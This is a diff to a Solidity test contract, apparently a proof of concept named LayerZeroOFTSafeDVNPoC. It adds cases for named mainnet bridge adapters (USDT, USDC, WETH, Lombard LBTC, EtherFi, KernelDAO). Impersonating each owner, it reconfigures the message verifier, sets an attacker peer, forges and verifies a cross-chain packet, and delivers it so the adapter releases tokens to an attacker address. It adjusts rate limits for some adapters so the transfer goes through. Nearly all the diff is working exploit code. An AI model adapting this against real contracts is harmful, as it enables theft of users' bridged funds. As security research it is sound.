@@ -19,6 +19,26 @@ interface IOFTAdapter {
     function decimalConversionRate() external view returns (uint256);
 }
 
+interface IEtherFiInboundRateLimits {
+    struct InboundRateLimit {
+        uint32 peerEid;
+        uint256 limit;
+        uint256 window;
+    }
+
+    function setInboundRateLimits(InboundRateLimit[] calldata limits) external;
+}
+
+interface ILombardRateLimits {
+    struct RateLimit {
+        bytes32 peer;
+        uint256 limit;
+        uint256 window;
+    }
+
+    function setRateLimits(RateLimit[] calldata limits, uint8 direction) external;
+}
+
 interface ILayerZeroEndpointV2 {
     struct SetConfigParam {
         uint32 eid;
@@ -113,6 +133,30 @@ contract LayerZeroOFTSafeDVNPoC {
                 adapter: address(uint160(0x00211cc4dd073734da055fbf44a2b4667d5e5fe5d2)),
                 owner: address(uint160(0x003b0aaf6e6fcd4a7ceef8c92c32dfea9e64dc1862)),
                 token: address(uint160(0x009d39a5de30e57443bff2a8307a4256c8797a3497)),
+                useDecimalConversionRate: true
+            })
+        );
+    }
+
+    function test_kerneldao_bridge_rseth_oftadapter_e98ef3() public {
+        _run(
+            Case({
+                name: "KernelDAO: Bridge RSETH_OFTAdapter",
+                adapter: address(uint160(0x0085d456b2dff1fd8245387c0bfb64dfb700e98ef3)),
+                owner: address(uint160(0x00cbcdd778aa25476f203814214dd3e9b9c46829a1)),
+                token: address(uint160(0x00a1290d69c65a6fe4df752f95823fae25cb99e5a7)),
+                useDecimalConversionRate: true
+            })
+        );
+    }
+
+    function test_etherfi_oft_etherfioftadapterupgradeable_cdca63() public {
+        _run(
+            Case({
+                name: "EtherFi - OFT EtherfiOFTAdapterUpgradeable",
+                adapter: address(uint160(0x00cd2eb13d6831d4602d80e5db9230a57596cdca63)),
+                owner: address(uint160(0x002aca71020de61bb532008049e1bd41e451ae8adc)),
+                token: address(uint160(0x00cd5fe23c85820f7b72d0926fc9b05b43e359b7ee)),
                 useDecimalConversionRate: true
             })
         );
@@ -250,6 +294,18 @@ contract LayerZeroOFTSafeDVNPoC {
         );
     }
 
+    function test_usdt_oft_layerzero_usdtoftadapter_474950() public {
+        _run(
+            Case({
+                name: "USDT OFT / LayerZero USDTOFTAdapter",
+                adapter: address(uint160(0x005e87d7e75b272fb7150b4d1a05afb6bd71474950)),
+                owner: address(uint160(0x00d7e22951de7af453aac5400d6e072e3b63beb7e2)),
+                token: address(uint160(0x00dac17f958d2ee523a2206206994597c13d831ec7)),
+                useDecimalConversionRate: true
+            })
+        );
+    }
+
     function test_acuoftadapter_acuoftadapter_ca33be() public {
         _run(
             Case({
@@ -281,6 +337,18 @@ contract LayerZeroOFTSafeDVNPoC {
                 adapter: address(uint160(0x00ac531eb26ca1d21b85126de8fb87e80e09002dcf)),
                 owner: address(uint160(0x006ec4090d0f3cb76d9f3d8c4d5bb058a225e560a1)),
                 token: address(uint160(0x003845badade8e6dff049820680d1f14bd3903a5d0)),
+                useDecimalConversionRate: true
+            })
+        );
+    }
+
+    function test_usdc_oft_layerzero_usdcoftadapter_d9eff2() public {
+        _run(
+            Case({
+                name: "USDC OFT / LayerZero USDCOFTAdapter",
+                adapter: address(uint160(0x00c209a627a7b0a19f16a963d9f7281667a2d9eff2)),
+                owner: address(uint160(0x00d7e22951de7af453aac5400d6e072e3b63beb7e2)),
+                token: address(uint160(0x00a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)),
                 useDecimalConversionRate: true
             })
         );
@@ -394,6 +462,54 @@ contract LayerZeroOFTSafeDVNPoC {
         );
     }
 
+    function test_weth_oft_layerzero_wethoftadapter_a526e8() public {
+        _run(
+            Case({
+                name: "WETH OFT / LayerZero WETHOFTAdapter",
+                adapter: address(uint160(0x0006e01cb086fea9c644a2c105a9f20cfc21a526e8)),
+                owner: address(uint160(0x00d7e22951de7af453aac5400d6e072e3b63beb7e2)),
+                token: address(uint160(0x00c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)),
+                useDecimalConversionRate: true
+            })
+        );
+    }
+
+    function test_lombard_lbtcoftadapter_126c31() public {
+        _run(
+            Case({
+                name: "Lombard LBTCOFTAdapter",
+                adapter: address(uint160(0x00acb11bc20b1945e59976e3307d2a805faa126c31)),
+                owner: address(uint160(0x00251a604e8e8f6906d60f8dedc5aaeb8cd38f4892)),
+                token: address(uint160(0x008236a87084f8b84306f72007f36f2618a5634494)),
+                useDecimalConversionRate: true
+            })
+        );
+    }
+
+    function test_usdt_oft_layerzero_usdtoft_15dfb0() public {
+        _run(
+            Case({
+                name: "USDT OFT / LayerZero UsdtOFT",
+                adapter: address(uint160(0x001f748c76de468e9d11bd340fa9d5cbadf315dfb0)),
+                owner: address(uint160(0x00a4e99d8dbf3accc7adb7b6d090181f5ae0460a18)),
+                token: address(uint160(0x00dac17f958d2ee523a2206206994597c13d831ec7)),
+                useDecimalConversionRate: false
+            })
+        );
+    }
+
+    function test_lombard_lbtcoftadapter_d95299() public {
+        _run(
+            Case({
+                name: "Lombard LBTCOFTAdapter",
+                adapter: address(uint160(0x003a7647c1323144a16e7d0d71a581e3fe5bd95299)),
+                owner: address(uint160(0x00251a604e8e8f6906d60f8dedc5aaeb8cd38f4892)),
+                token: address(uint160(0x008236a87084f8b84306f72007f36f2618a5634494)),
+                useDecimalConversionRate: true
+            })
+        );
+    }
+
     function test_resolv_usroftadapter_d4be0e() public {
         _run(
             Case({
@@ -432,6 +548,7 @@ contract LayerZeroOFTSafeDVNPoC {
         require(amountSd <= type(uint64).max, "amountSD overflows uint64");
         uint256 amountLd = amountSd * conversionRate;
 
+        uint32 srcEid = _srcEid(c.adapter);
         bytes32 ownerB32 = _addressToBytes32(c.owner);
         bytes32 attackerPeerB32 = _addressToBytes32(ATTACKER_PEER);
         bytes32 recipientB32 = _addressToBytes32(ATTACKER);
@@ -454,7 +571,7 @@ contract LayerZeroOFTSafeDVNPoC {
         ILayerZeroEndpointV2.SetConfigParam[] memory params =
             new ILayerZeroEndpointV2.SetConfigParam[](1);
         params[0] = ILayerZeroEndpointV2.SetConfigParam({
-            eid: SRC_EID,
+            eid: srcEid,
             configType: 2,
             config: ulnConfig
         });
@@ -462,21 +579,22 @@ contract LayerZeroOFTSafeDVNPoC {
         bytes memory packetHeader = abi.encodePacked(
             uint8(1),
             NONCE,
-            SRC_EID,
+            srcEid,
             attackerPeerB32,
             DST_EID,
             adapterB32
         );
         require(packetHeader.length == 81, "bad packet header length");
-        bytes memory message = abi.encodePacked(recipientB32, uint64(amountSd));
-        require(message.length == 40, "bad OFT message length");
+        bytes memory message = _oftMessage(c.adapter, recipientB32, uint64(amountSd));
         bytes32 payloadHash = keccak256(abi.encodePacked(GUID, message));
 
         vm.prank(c.owner);
         ILayerZeroEndpointV2(ENDPOINT).setConfig(c.adapter, RECEIVE_ULN302, params);
 
         vm.prank(c.owner);
-        IOApp(c.adapter).setPeer(SRC_EID, attackerPeerB32);
+        IOApp(c.adapter).setPeer(srcEid, attackerPeerB32);
+
+        _applyRateLimitIfNeeded(c, srcEid, amountLd);
 
         vm.prank(c.owner);
         IReceiveUln302(RECEIVE_ULN302).verify(packetHeader, payloadHash, 1);
@@ -486,7 +604,7 @@ contract LayerZeroOFTSafeDVNPoC {
 
         vm.prank(c.owner);
         ILayerZeroEndpointV2(ENDPOINT).lzReceive(
-            ILayerZeroEndpointV2.Origin({srcEid: SRC_EID, sender: attackerPeerB32, nonce: NONCE}),
+            ILayerZeroEndpointV2.Origin({srcEid: srcEid, sender: attackerPeerB32, nonce: NONCE}),
             c.adapter,
             GUID,
             message,
@@ -500,6 +618,54 @@ contract LayerZeroOFTSafeDVNPoC {
         require(beforeAdapter - afterAdapter == amountLd, "unexpected adapter delta");
         ownerB32;
         bytes(c.name);
+    }
+
+    function _srcEid(address adapter) internal pure returns (uint32) {
+        if (
+            adapter == address(uint160(0x00cd2eb13d6831d4602d80e5db9230a57596cdca63))
+                || adapter == address(uint160(0x00acb11bc20b1945e59976e3307d2a805faa126c31))
+                || adapter == address(uint160(0x003a7647c1323144a16e7d0d71a581e3fe5bd95299))
+        ) {
+            return 30106;
+        }
+        return SRC_EID;
+    }
+
+    function _oftMessage(address adapter, bytes32 recipient, uint64 amountSd) internal pure returns (bytes memory) {
+        bytes memory payload = abi.encodePacked(recipient, amountSd);
+        if (adapter == address(uint160(0x001f748c76de468e9d11bd340fa9d5cbadf315dfb0))) {
+            return abi.encodePacked(uint16(2), payload);
+        }
+        require(payload.length == 40, "bad OFT message length");
+        return payload;
+    }
+
+    function _applyRateLimitIfNeeded(Case memory c, uint32 srcEid, uint256 amountLd) internal {
+        uint256 limit = amountLd * 2;
+        if (c.adapter == address(uint160(0x00cd2eb13d6831d4602d80e5db9230a57596cdca63))) {
+            IEtherFiInboundRateLimits.InboundRateLimit[] memory limits =
+                new IEtherFiInboundRateLimits.InboundRateLimit[](1);
+            limits[0] = IEtherFiInboundRateLimits.InboundRateLimit({
+                peerEid: srcEid,
+                limit: limit,
+                window: 1
+            });
+            vm.prank(c.owner);
+            IEtherFiInboundRateLimits(c.adapter).setInboundRateLimits(limits);
+        }
+        if (
+            c.adapter == address(uint160(0x00acb11bc20b1945e59976e3307d2a805faa126c31))
+                || c.adapter == address(uint160(0x003a7647c1323144a16e7d0d71a581e3fe5bd95299))
+        ) {
+            ILombardRateLimits.RateLimit[] memory limits = new ILombardRateLimits.RateLimit[](1);
+            limits[0] = ILombardRateLimits.RateLimit({
+                peer: bytes32(uint256(srcEid)),
+                limit: limit,
+                window: 1
+            });
+            vm.prank(c.owner);
+            ILombardRateLimits(c.adapter).setRateLimits(limits, 0);
+        }
     }
 
     function _addressToBytes32(address account) internal pure returns (bytes32) {
